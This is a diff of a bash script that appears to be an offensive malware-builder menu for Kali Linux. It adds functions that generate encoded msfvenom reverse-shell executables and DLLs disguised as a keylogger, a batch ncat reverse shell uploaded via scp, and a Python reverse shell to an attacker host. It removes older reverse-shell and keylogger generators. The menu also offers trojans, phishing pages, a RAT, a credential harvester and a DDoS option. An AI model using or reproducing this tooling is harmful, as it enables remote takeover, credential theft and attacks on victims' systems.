@@ -1,5 +1,12 @@
 #!/bin/bash
 
+
+
+
+
+
+
+
 display_kali_dragon() {
     art=(
         "__________                                      .__  __"         
@@ -37,6 +44,13 @@ display_kali_dragon() {
     done
 }
 
+
+
+
+
+
+
+
 # Function to check dependencies
 check_dependencies() {
     local dependencies=(gcc mingw-w64 msfvenom wireshark metasploit airgeddon upx)
@@ -66,9 +80,17 @@ check_dependencies() {
 
 
 
+
+
+
+
 # Call the functions at the start of the script
 check_dependencies
 display_kali_dragon
+
+
+
+
 
 # Function to generate a manually obfuscated DLL with randomization
 generate_obfuscated_dll() {
@@ -81,6 +103,10 @@ generate_obfuscated_dll() {
     echo "$obfuscated_code" > "${dll_name}.dll"
     echo "Manually obfuscated DLL created: ${dll_name}.dll"
 }
+
+
+
+
 
 # Function to generate DLL using msfvenom with advanced encoding
 generate_dll_with_msfvenom() {
@@ -108,19 +134,108 @@ EOF
     echo "Self-decrypting loader created: loader.ps1"
 }
 
-# Function to create a reverse shell using Ncat with random sleep and persistence
-create_ncat_reverse_shell() {
-    echo "Creating Ncat reverse shell with persistence..."
-    read -p "Enter LHOST: " lhost
-    read -p "Enter LPORT: " lport
-    cat <<EOF > ncat_reverse_shell.bat
-@echo off
-:loop
-timeout /t $((RANDOM % 10 + 5)) >nul && ncat $lhost $lport -e cmd.exe
-goto loop
-EOF
-    echo "Reverse shell script with persistence created: ncat_reverse_shell.bat"
+
+# Function to generate a keylogger payload using msfvenom with SSH reverse shell
+generate_keylogger_with_ssh_msfvenom() {
+    echo "==============================="
+    echo "   Generate Keylogger Payload"
+    echo "==============================="
+    
+    # Prompt for payload, LHOST, and LPORT
+    read -p "Enter payload (e.g., windows/x64/meterpreter/reverse_tcp): " payload
+    read -p "Enter LHOST (Listener IP - your SSH server IP): " lhost
+    read -p "Enter LPORT (Listener Port on SSH server): " lport
+
+    # Confirm details
+    echo "You entered:"
+    echo "Payload: $payload"
+    echo "LHOST (SSH Server): $lhost"
+    echo "LPORT: $lport"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting keylogger generation. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Generate the keylogger payload using msfvenom
+    echo "Generating keylogger payload with msfvenom..."
+    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f exe -e x86/shikata_ga_nai -o keylogger.exe
+    
+    # Check if the msfvenom command was successful
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to generate the keylogger payload."
+        return 1
+    fi
+
+    echo "Keylogger payload generated: keylogger.exe"
+    echo "==============================="
+
+    # Next steps: Set up your SSH server to listen for the reverse shell.
+    echo "To listen for the incoming reverse shell connection on your SSH server, run:"
+    echo "ssh -R $lport:localhost:$lport $lhost"
+
+    echo "Once the target runs the keylogger, it will connect back to your SSH listener."
+    echo "==============================="
 }
+
+
+
+
+
+
+
+# Function to create a reverse shell using Ncat with random sleep and persistence
+# Function to generate DLL with msfvenom that connects back to an SSH listener
+generate_dll_with_msfvenom_with_ssh() {
+    echo "==============================="
+    echo "   Generate DLL with msfvenom"
+    echo "==============================="
+    
+    # Prompt for payload, LHOST, and LPORT
+    read -p "Enter payload (e.g., windows/meterpreter/reverse_tcp): " payload
+    read -p "Enter LHOST (Listener IP - your SSH server IP): " lhost
+    read -p "Enter LPORT (Listener Port on SSH server): " lport
+
+    # Confirm details
+    echo "You entered:"
+    echo "Payload: $payload"
+    echo "LHOST (SSH Server): $lhost"
+    echo "LPORT: $lport"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting DLL generation. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Generate the DLL with msfvenom
+    echo "Generating DLL payload with msfvenom..."
+    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f dll -e x86/shikata_ga_nai -o payload.dll
+    
+    # Check if the msfvenom command was successful
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to generate the DLL payload."
+        return 1
+    fi
+
+    echo "DLL payload generated: payload.dll"
+    echo "==============================="
+
+    # Next steps: Set up your SSH server to listen for the reverse shell.
+    echo "To listen for the incoming reverse shell connection on your SSH server, run:"
+    echo "ssh -R $lport:localhost:$lport $lhost"
+
+    echo "Once the target runs the payload, it will connect back to your SSH listener."
+    echo "==============================="
+}
+
+
+
+
+
+
+
 
 # Function to create a PowerShell reverse shell with advanced obfuscation
 create_powershell_reverse_shell() {
@@ -133,8 +248,15 @@ create_powershell_reverse_shell() {
     echo "PowerShell reverse shell script created: powershell_reverse_shell.ps1"
 }
 
-# Function to create a Batch reverse shell with dynamic variable names
-create_batch_reverse_shell() {
+
+
+
+
+
+
+
+# Function to create a Batch reverse shell with dynamic variable names and transfer via SSH
+create_batch_reverse_shell_ssh() {
     echo "Creating Batch reverse shell with dynamic names..."
     read -p "Enter LHOST: " lhost
     read -p "Enter LPORT: " lport
@@ -143,42 +265,99 @@ create_batch_reverse_shell() {
     echo "set LPORT=$lport" >> batch_reverse_shell.bat
     echo "timeout /t %random% %% 10 + 5 >nul && cmd.exe /c ncat %LHOST% %LPORT% -e cmd.exe" >> batch_reverse_shell.bat
     echo "Batch reverse shell script created: batch_reverse_shell.bat"
+
+    # Prompt for SSH details
+    read -p "Enter your SSH server IP address: " ssh_ip
+    read -p "Enter your SSH port (default 2222): " ssh_port
+    ssh_port=${ssh_port:-2222}
+    read -p "Enter your SSH username: " ssh_user
+
+    # Confirm user input
+    echo "You entered:"
+    echo "SSH Server IP: $ssh_ip"
+    echo "SSH Port: $ssh_port"
+    echo "SSH Username: $ssh_user"
+
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Send the generated Batch script to the SSH server
+    scp -P "$ssh_port" batch_reverse_shell.bat "$ssh_user@$ssh_ip:/home/$ssh_user/"
+
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to send the Batch script to the SSH server."
+        return 1
+    fi
+
+    echo "Batch reverse shell script successfully transferred to SSH server: $ssh_ip"
 }
 
-# Function to create a Python reverse shell with dynamic encoding
-create_python_reverse_shell() {
-    echo "Creating Python reverse shell with dynamic encoding..."
-    read -p "Enter LHOST: " lhost
-    read -p "Enter LPORT: " lport
-    encoded_command=$(echo "import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('$lhost', $lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['cmd.exe'])" | base64)
+
+
+
+
+
+
+# Function to create a Python reverse shell that connects to an SSH server
+create_python_reverse_shell_with_ssh() {
+    echo "Creating Python reverse shell that connects to an SSH server..."
+    
+    # Prompt for SSH connection details
+    read -p "Enter your SSH server IP address: " ssh_ip
+    read -p "Enter your SSH port (default 2222): " ssh_port
+    ssh_port=${ssh_port:-2222}
+    read -p "Enter your SSH username: " ssh_user
+    read -p "Enter your reverse shell listening port (e.g., 4444): " lport
+
+    # Confirm user input
+    echo "You entered:"
+    echo "SSH Server IP: $ssh_ip"
+    echo "SSH Port: $ssh_port"
+    echo "SSH Username: $ssh_user"
+    echo "Reverse Shell Listening Port: $lport"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting the reverse shell creation process."
+        return 1
+    fi
+
+    # Create the Python reverse shell script
     cat <<EOF > python_reverse_shell.py
-import base64
-exec(base64.b64decode("$encoded_command"))
+import socket
+import subprocess
+import os
+
+# Establishing a connection to the SSH server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('$ssh_ip', $lport))  # Connect to the SSH server on the specified port
+
+# Redirect stdin, stdout, and stderr to the socket
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+# Execute a shell
+subprocess.call(['cmd.exe'])  # For Windows targets
 EOF
+
     echo "Python reverse shell script created: python_reverse_shell.py"
+
+    echo "To listen for incoming connections, run this command on your SSH server:"
+    echo "ssh -p $ssh_port $ssh_user@$ssh_ip"
+    echo "Once connected, the reverse shell will link back to your SSH server on port $lport."
 }
 
-# Function to generate a keylogger with advanced techniques
-generate_keylogger() {
-    echo "Generating advanced keylogger..."
-    cat <<EOF > keylogger.py
-import pynput
-import base64
-import threading
 
-def on_press(key):
-    with open("log.txt", "a") as f:
-        f.write(base64.b64encode(str(key).encode()).decode() + "\\n")
 
-def start_listener():
-    with pynput.keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
 
-thread = threading.Thread(target=start_listener)
-thread.start()
-EOF
-    echo "Advanced keylogger created: keylogger.py"
-}
+
+
+
+
 
 generate_trojan_executable_ssh() {
     echo "==============================="
@@ -1233,72 +1412,93 @@ EOF
     echo "Credential harvester created: harvester.py"
 }
 
-# Main menu
+# Define color codes
+BLUE='\033[0;34m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+NC='\033[0m' # No Color
+
 while true; do
-    echo "Choose an option:"
-    echo "1) Generate manually obfuscated DLL"
-    echo "2) Generate DLL with msfvenom"
-    echo "3) Create encrypted EXE loader"
-    echo "4) Create Ncat reverse shell"
-    echo "5) Create PowerShell reverse shell"
-    echo "6) Create Batch reverse shell"
-    echo "7) Create Python reverse shell"
-    echo "8) Generate keylogger"
-    echo "9) Generate trojan executable"
-    echo "10) Create phishing page"
-    echo "11) Generate Windows service payload"
-    echo "12) Create payload for USB exploitation"
-    echo "13) Generate reverse HTTPS payload"
-    echo "14) Create payload with persistence"
-    echo "15) Generate fake update payload"
-    echo "16) Create process injection payload"
-    echo "17) Generate network scanning payload"
-    echo "18) Create RAT"
-    echo "19) Generate Wi-Fi password sniffer"
-    echo "20) Generate simple SQL injection script"
-    echo "21) Create credential harvester"
-    echo "22) Start anonsurf"
-    echo "23) Start metasploit_framework"
-    echo "24) Start airgeddon "
-    echo "25) Start wireshark "
-    echo "26) Start I2P DDOS attack"
-    echo "27) DEAMON MANAGER by V.ex.e"
-    echo "28) Start listening for zombies"
-    echo "29) Generate Trojan.exe that connects to DEAMON MANAGER by V.ex.e"
-    echo "0) Exit"
+    echo -e "${BLUE}Choose an option:${NC}"
+    
+    # NCAT
+    echo -e "${RED}1) Generate manually obfuscated DLL >> NCAT${NC}"
+    echo -e "${RED}2) Generate trojan executable >> NCAT${NC}"
+    
+    # SSH I2P Deamon manager
+    echo -e "${RED}3) Generate DLL with msfvenom >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}4) Create Ncat reverse shell >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}5) Create PowerShell reverse shell >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}6) Create Batch reverse shell >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}7) Create Python reverse shell >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}8) Generate keylogger with msfvenom >> SSH I2P Deamon manager${NC}"
+    echo -e "${RED}9) Generate Trojan.exe that connects to DEAMON MANAGER by V.ex.e >> SSH I2P Deamon manager${NC}"
+    
+    # Customizable
+    echo -e "${RED}10) Create phishing page >> Customizable${NC}"
+    echo -e "${RED}11) Generate Windows service payload >> Customizable${NC}"
+    echo -e "${RED}12) Create encrypted loader >> Customizable${NC}"
+    echo -e "${RED}13) Create payload for USB exploitation >> Add-on for created trojans/exe${NC}"
+    echo -e "${RED}14) Generate reverse HTTPS payload >> Customizable${NC}"
+    echo -e "${RED}15) Create payload with persistence >> Customizable${NC}"
+    echo -e "${RED}16) Generate fake update payload >> Customizable${NC}"
+    echo -e "${RED}17) Create process injection payload >> Customizable${NC}"
+    
+    # Self explanatory
+    echo -e "${RED}18) Generate network scanning payload >> Self explanatory${NC}"
+    echo -e "${RED}19) Create RAT >> Self explanatory${NC}"
+    echo -e "${RED}20) Generate Wi-Fi password sniffer >> Self explanatory${NC}"
+    echo -e "${RED}21) Generate simple SQL injection script >> Self explanatory${NC}"
+    echo -e "${RED}22) Create credential harvester >> Self explanatory${NC}"
+    echo -e "${BLUE}23) Start metasploit_framework >> Self explanatory${NC}"
+    echo -e "${BLUE}24) Start airgeddon >> Self explanatory${NC}"
+    echo -e "${BLUE}25) Start wireshark >> Self explanatory${NC}"
+    echo -e "${BLUE}26) Start I2P DDOS attack >> Self explanatory${NC}"
+    
+    # Additional options
+    echo -e "${BLUE}27) Start anonsurf >> Routes all traffic through I2P/Tor${NC}"
+    echo -e "${GREEN}28) Start listening for zombies >> Simpler listener${NC}"
+    echo -e "${GREEN}29) DEAMON MANAGER by V.ex.e >> SSH I2P Reverse shells connect to this${NC}"
+    echo -e "${GREEN}30) Start listening for zombies >> Simpler listener${NC}"
+    
+    echo -e "${BLUE}0) Exit${NC}"
     read -p "Enter your choice: " choice
 
     case $choice in
         1) display_kali_dragon; generate_obfuscated_dll ;;
-        2) display_kali_dragon; generate_dll_with_msfvenom ;;
-        3) display_kali_dragon; create_encrypted_loader ;;
+        2) display_kali_dragon; generate_trojan_executable ;;
+        3) display_kali_dragon; generate_dll_with_msfvenom ;;
         4) display_kali_dragon; create_ncat_reverse_shell ;;
         5) display_kali_dragon; create_powershell_reverse_shell ;;
-        6) display_kali_dragon; create_batch_reverse_shell ;;
+        6) display_kali_dragon; create_batch_reverse_shell_ssh ;;
         7) display_kali_dragon; create_python_reverse_shell ;;
-        8) display_kali_dragon; generate_keylogger ;;
-        9) display_kali_dragon; generate_trojan_executable ;;
+        8) display_kali_dragon; generate_keylogger_with_ssh_msfvenom ;;
+        9) display_kali_dragon; generate_trojan_executable_ssh ;;
         10) display_kali_dragon; create_phishing_page ;;
         11) display_kali_dragon; generate_windows_service_payload ;;
-        12) display_kali_dragon; create_usb_exploitation_payload ;;
-        13) display_kali_dragon; generate_reverse_https_payload ;;
-        14) display_kali_dragon; create_persistence_payload ;;
-        15) display_kali_dragon; generate_fake_update_payload ;;
-        16) display_kali_dragon; create_process_injection_payload ;;
-        17) display_kali_dragon; generate_network_scanning_payload ;;
-        18) display_kali_dragon; create_rat ;;
-        19) display_kali_dragon; generate_wifi_password_sniffer ;;
-        20) display_kali_dragon; generate_sql_injection_script ;;
-        21) display_kali_dragon; create_credential_harvester ;;
-        22) display_kali_dragon; start_anonsurf ;;
+        12) display_kali_dragon; create_encrypted_loader ;;  # Added here9
+        13) display_kali_dragon; create_usb_exploitation_payload ;;
+        14) display_kali_dragon; generate_reverse_https_payload ;;
+        15) display_kali_dragon; create_persistence_payload ;;
+        16) display_kali_dragon; generate_fake_update_payload ;;
+        17) display_kali_dragon; create_process_injection_payload ;;
+        18) display_kali_dragon; generate_network_scanning_payload ;;
+        19) display_kali_dragon; create_rat ;;
+        20) display_kali_dragon; generate_wifi_password_sniffer ;;
+        21) display_kali_dragon; generate_sql_injection_script ;;
+        22) display_kali_dragon; create_credential_harvester ;;
         23) display_kali_dragon; start_metasploit_framework ;;
         24) display_kali_dragon; start_airgeddon ;;
         25) display_kali_dragon; start_wireshark ;;
         26) display_kali_dragon; ddos_attack ;;
-        27) display_kali_dragon; start_listener ;;
-        28) display_kali_dragon; start_ssh_server ;;
-        29) display_kali_dragon; generate_trojan_executable_ssh ;;
+        27) display_kali_dragon; start_anonsurf ;;
+        28) display_kali_dragon; start_listener ;;
+        29) display_kali_dragon; start_ssh_server ;;
+        30) display_kali_dragon; start_listener ;; # Duplicate, consider adjusting
         0) display_kali_dragon; exit ;;
         *) echo "Invalid option!" ;;
     esac
 done
+
+
+
